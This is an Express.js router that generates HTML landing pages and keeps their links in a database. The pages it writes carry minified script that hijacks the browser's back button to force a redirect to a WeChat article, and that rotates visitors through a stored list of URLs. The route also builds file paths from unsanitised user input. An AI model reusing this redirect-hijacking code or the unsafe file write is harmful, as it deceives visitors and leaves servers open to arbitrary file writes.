
var express = require('express');
var fs = require('fs');//引入node的文件(夹)读写包
var router = express.Router();
var app = express();
var routeSql = require('../sql/routeSql.js');
var Sequelize = require('sequelize');
var sequelize = require('../sql/sqlConnect.js')

router.post('/CreateFile',function(req,res){
    if (req.body.LinkName == '') {
        res.send({error:2,result:{msg:'名称不能为空'}})
    } else {
        routeSql.FileLinkName.findOne({where:{LinkName:req.body.LinkName,IsDeleted:false}}).then(function(data){
    		if (data) {
                res.send({error:1,result:{msg:'该名称已被创建，请重新命名'}})
            } else {
                routeSql.FileLinkName.create({LinkName:req.body.LinkName,LinkUrl:'localhost:8800/'+req.body.LinkName+'.html',Desc:req.body.Desc}).then(function(){
                    var HtmlUrl = './www/' + req.body.LinkName + '.html';
                    var Str = '<!DOCTYPE html><html lang="en" xmlns="http://www.w3.org/1999/html"><head><meta charset="gb2312"><title>.</title></head><body></body><script>function aa(){window.history.pushState({title:"title",url:"#"},"title","#"),window.addEventListener("popstate",function(e){window.location="http://mp.weixin.qq.com/s/PUn07nIWUypWjWuAK4zREw"},!1)}function count(e){var t=getCookie("gangdan");!t||1e4<=t?(t=0,setCookie("gangdan",1,14)):setCookie("gangdan",t+1,14);var n=t%e.length;alert(n),window.location=e[n]}function ajax(){var e={type:arguments[0].type||"GET",url:arguments[0].url||"",async:arguments[0].async||"true",data:arguments[0].data||null,dataType:arguments[0].dataType||"text",contentType:arguments[0].contentType||"application/x-www-form-urlencoded",beforeSend:arguments[0].beforeSend||function(){},success:arguments[0].success||function(){},error:arguments[0].error||function(){}};e.beforeSend();var t=createxmlHttpRequest();t.responseType=e.dataType,t.open(e.type,e.url,e.async),t.setRequestHeader("Content-Type",e.contentType),t.send(convertData(e.data)),t.onreadystatechange=function(){4==t.readyState&&(200==t.status?e.success(t.response):e.error())}}function createxmlHttpRequest(){return window.ActiveXObject?new ActiveXObject("Microsoft.XMLHTTP"):window.XMLHttpRequest?new XMLHttpRequest:void 0}function convertData(e){if("object"==typeof e){var t="";for(var n in e)t+=n+"="+e[n]+"&";return t=t.substring(0,t.length-1)}return e}function setCookie(e,t,n){var o=new Date;o.setDate(o.getDate()+n),document.cookie=e+"="+t+";expires="+o}function getCookie(e){for(var t=document.cookie.split(";"),n=0;n<t.length;n++){var o=t[n].split("=");if(o[0]==e)return Number(o[1])}return getRandom(1,2)}function removeCookie(e){setCookie(e,1,-1)}function getRandom(e,t){var n=Math.random()*(t-e),o=Math.round(n+e);return o=Math.max(Math.min(o,t),e)}aa(),ajax({type:"GET",url:"/LinkUrlList?LinkName="+window.location.href.substring(window.location.href.lastIndexOf("/")+1,window.location.href.lastIndexOf(".")),dataType:"json",data:{},beforeSend:function(){},success:function(e){console.log(e);var t=[];e.result.map(function(e){t.push(e.LinkUrl)}),console.log(t),count(t)},error:function(){console.log("error")}})</script></html>'
                    fs.writeFile(HtmlUrl,Str,function(err, written, string){
                        if (err) {
                            res.send({error:1,result:err});
                        } else {
                            res.send({error:0,result:{msg:'文件创建成功'}});
                        }
                    })
                })
            }
    	})
    }
})

router.get('/FileUrlList',function(req,res){
    routeSql.FileLinkName.findAll({where:{IsDeleted:false},order:[['Id','ASC']],attributes:['Id','LinkName','LinkUrl','Desc']}).then(function(FileLinkData){
        res.send({error:0,result:FileLinkData});
    });
})

router.get('/DeleteFile',function(req,res){
    routeSql.FileLinkName.findOne({where:{Id:req.query.Id,IsDeleted:false}}).then(function(FileData){
        if (FileData) {
            routeSql.FileLinkName.update({IsDeleted:true},{where:{Id:req.query.Id,IsDeleted:false}}).then(function(){
                routeSql.AbpLink.update({IsDeleted:true},{where:{FileLinkId:req.query.Id,IsDeleted:false}}).then(function(){
                    res.send({error:0,result:{msg:'删除成功'}})
                })
            })
        } else {
            res.send({error:1,result:{msg:'链接文件不存在'}})
        }
    })
})

module.exports = router;



